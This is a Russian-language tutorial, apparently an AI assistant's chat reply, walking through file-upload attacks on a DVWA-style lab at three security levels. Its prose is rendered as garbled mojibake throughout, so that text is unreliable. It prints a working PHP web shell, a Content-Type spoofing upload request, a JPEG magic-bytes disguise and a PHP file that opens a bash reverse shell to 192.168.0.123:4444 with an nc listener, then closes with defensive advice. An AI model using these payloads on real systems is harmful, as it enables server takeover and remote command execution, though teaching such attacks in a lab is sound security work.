–ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ **File Upload —É—è–∑–≤–∏–º–æ—Å—Ç—è–º** ‚Äî –æ–¥–Ω–æ–π –∏–∑ —Å–∞–º—ã—Ö –æ–ø–∞—Å–Ω—ã—Ö –∫–∞—Ç–µ–≥–æ—Ä–∏–π, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∞ –Ω–∞–ø—Ä—è–º—É—é –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ **—É–¥–∞–ª—ë–Ω–Ω–æ–º—É –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –∫–æ–¥–∞ (RCE)**.

---

## üîç –û–±—â–µ–µ –æ–ø–∏—Å–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ File Upload

**File Upload** ‚Äî —ç—Ç–æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ —Å–µ—Ä–≤–µ—Ä. –ü—Ä–æ–±–ª–µ–º–∞ –≤–æ–∑–Ω–∏–∫–∞–µ—Ç, –µ—Å–ª–∏:

* –ù–µ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è **—Å–æ–¥–µ—Ä–∂–∞–Ω–∏–µ** —Ñ–∞–π–ª–∞.
* –ü—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è **—Ç–æ–ª—å–∫–æ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ** (e.g. `.png`), –∞ –Ω–µ **MIME-type** –∏ **magic bytes**.
* –ó–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –≤ **–∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π –∫–∞—Ç–∞–ª–æ–≥** (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/uploads/`, –¥–æ—Å—Ç—É–ø–Ω—ã–π –ø–æ HTTP).
* –ù–µ—Ç **–≤–∞–ª–∏–¥–∞—Ü–∏–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ** —Ñ–∞–π–ª–∞ –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞.
* MIME-—Ç–∏–ø –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è **–Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ**, –∞ –Ω–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.

---

## üß™ –£—Ä–æ–≤–µ–Ω—å Low

–ó–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è **–ª—é–±–æ–π** —Ñ–∞–π–ª. –§–∞–π–ª –º–æ–∂–Ω–æ –Ω–∞–∑–≤–∞—Ç—å `shell.php`, –æ–Ω –±—É–¥–µ—Ç –¥–æ—Å—Ç—É–ø–µ–Ω –ø–æ URL:

```
http://localhost:8081/hackable/uploads/shell.php
```

–°–æ–¥–µ—Ä–∂–∏–º–æ–µ shell-—Ñ–∞–π–ª–∞:

```php
<?php system($_GET['cmd']); ?>
```

–¢–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–º–∞–Ω–¥—ã:

```
http://localhost:8081/hackable/uploads/shell.php?cmd=id
```

---

## üõ°Ô∏è –£—Ä–æ–≤–µ–Ω—å Medium

–ó–∞–≥—Ä—É–∑–∫–∞ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∞ **—Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è–º–∏ `.jpg`, `.png`**.

### üîì –û–±—Ö–æ–¥:

* –ó–∞–≥—Ä—É–∂–∞–µ–º —Å–∫—Ä–∏–ø—Ç –ø–æ–¥ –∏–º–µ–Ω–µ–º:

  ```
  shell.php.png
  ```
* –ò–ª–∏ –¥–∞–∂–µ:

  ```
  shell.png
  ```

  –ù–æ —Å–∞–º —Ñ–∞–π–ª —Å–æ–¥–µ—Ä–∂–∏—Ç PHP-–∫–æ–¥.

–°–µ—Ä–≤–µ—Ä –º–æ–∂–µ—Ç –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–ª—å–∫–æ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ, –Ω–æ –Ω–µ –∑–∞–≥–ª—è–¥—ã–≤–∞–µ—Ç –≤–Ω—É—Ç—Ä—å, –ø–æ—ç—Ç–æ–º—É —Ñ–∞–π–ª –≤—Å–µ —Ä–∞–≤–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è –∫–∞–∫ PHP, –µ—Å–ª–∏ –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é, –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º—É—é PHP-–∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–æ–º.

---

## üîí –£—Ä–æ–≤–µ–Ω—å High

–ù–∞ —ç—Ç–æ–º —É—Ä–æ–≤–Ω–µ:

* –ü—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ
* –ü—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è MIME-type (Content-Type)
* –í–æ–∑–º–æ–∂–Ω–æ, –ø—Ä–æ–≤–µ—Ä—è—é—Ç—Å—è **magic bytes** (–Ω–∞—á–∞–ª—å–Ω—ã–µ –±–∞–π—Ç—ã —Ñ–∞–π–ª–∞)

### üîì –û–±—Ö–æ–¥:

1. –ú–µ–Ω—è–µ–º **Content-Type** –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ:

–í Burp –∏–ª–∏ curl:

```http
POST /vulnerabilities/upload/
Content-Type: multipart/form-data; boundary=---123

-----123
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
-----123--
```

2. –õ–∏–±–æ —Å–æ–∑–¥–∞–µ–º **dual extension**:

```text
shell.php.jpg
```

3. –õ–∏–±–æ –¥–æ–±–∞–≤–ª—è–µ–º **"magic bytes" JPEG** –≤ –Ω–∞—á–∞–ª–æ —Ñ–∞–π–ª–∞:

```php
<?php
// —Ñ–∞–π–ª: evil.jpg
echo "\xFF\xD8\xFF"; // JPEG header
echo "<?php system(\$_GET['cmd']); ?>";
?>
```

–¢–∞–∫–æ–π —Ñ–∞–π–ª –ø—Ä–æ–π–¥–µ—Ç –∫–∞–∫ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ, –Ω–æ –±—É–¥–µ—Ç –æ–±—Ä–∞–±–æ—Ç–∞–Ω PHP, –µ—Å–ª–∏ –ø–æ–ø–∞–ª –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é.

---

## üí£ –ó–∞–≥—Ä—É–∂–∞–µ–º —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π —Å—Ä–∞–∑—É –≤—ã–ø–æ–ª–Ω–∏—Ç –±—ç–∫–¥–æ—Ä

### ‚úÖ –¶–µ–ª—å:

–°—Ä–∞–∑—É –ø—Ä–∏ –∑–∞—Ö–æ–¥–µ –Ω–∞ —Ñ–∞–π–ª ‚Äî –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π **reverse shell** –∏–ª–∏ –±—ç–∫–¥–æ—Ä.

### üí• –ü—Ä–∏–º–µ—Ä `auto_rce.php`

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.123/4444 0>&1'");
?>
```

1. –ó–∞–ø—É—Å–∫–∞–µ–º listener –Ω–∞ –∞—Ç–∞–∫—É—é—â–µ–π –º–∞—à–∏–Ω–µ:

```bash
nc -lvnp 4444
```

2. –ó–∞–≥—Ä—É–∂–∞–µ–º —Ñ–∞–π–ª –ø–æ–¥ –∏–º–µ–Ω–µ–º:

```
auto_rce.php.jpg
```

3. –ü–µ—Ä–µ—Ö–æ–¥–∏–º –≤ –±—Ä–∞—É–∑–µ—Ä–µ –ø–æ:

```
http://localhost:8081/hackable/uploads/auto_rce.php.jpg
```

–ë—ç–∫–∫–æ–Ω–Ω–µ–∫—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!

---

## üõ°Ô∏è –ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è

* ‚ùå **–ù–∏–∫–æ–≥–¥–∞** –Ω–µ –ø–æ–ª–∞–≥–∞—Ç—å—Å—è –Ω–∞ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ!
* ‚úÖ –ü—Ä–æ–≤–µ—Ä—è–π—Ç–µ **MIME-type** –∏ **magic bytes**
* üö´ –•—Ä–∞–Ω–∏—Ç–µ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã **–≤–Ω–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞**
* üîê –ù–µ –¥–∞–≤–∞–π—Ç–µ —Ñ–∞–π–ª–∞–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ –∏–º–µ–Ω–∞ ‚Äî —Å–æ—Ö—Ä–∞–Ω—è–π—Ç–µ –∏—Ö –∫–∞–∫ UUID
* üßπ –°–∫–∞–Ω–∏—Ä—É–π—Ç–µ —Ñ–∞–π–ª—ã –Ω–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ (–Ω–∞–ø—Ä–∏–º–µ—Ä, `php -l` –∏–ª–∏ ClamAV)
* üõë –û—Ç–∫–ª—é—á–∏—Ç–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ PHP –≤ –ø–∞–ø–∫–µ –∑–∞–≥—Ä—É–∑–∫–∏ (`.htaccess`):

```apache
php_flag engine off
```

---

## ‚úÖ –ü–æ–¥—ã—Ç–æ–∂–∏–º

| –£—Ä–æ–≤–µ–Ω—å    | –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è                 | –û–±—Ö–æ–¥                                    |
| ---------- | --------------------------- | ---------------------------------------- |
| **Low**    | –ù–µ—Ç                         | –ü—Ä—è–º–æ–π PHP-—Ñ–∞–π–ª                          |
| **Medium** | –†–∞—Å—à–∏—Ä–µ–Ω–∏—è (`.jpg`, `.png`) | `shell.php.png`                          |
| **High**   | MIME + —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ           | MIME spoof, JPEG magic bytes, `.php.jpg` |

---

–ï—Å–ª–∏ –≥–æ—Ç–æ–≤ ‚Äî –º–æ–∂–µ–º –ø–µ—Ä–µ–π—Ç–∏ –∫ —Å–ª–µ–¥—É—é—â–∏–º —É—è–∑–≤–∏–º–æ—Å—Ç—è–º: **XXE**, **IDOR**, **Open Redirect**, **Authentication bypass** –∏–ª–∏ **JWT attacks**.

–ö–∞–∫–æ–π –≤—ã–±–∏—Ä–∞–µ—à—å?
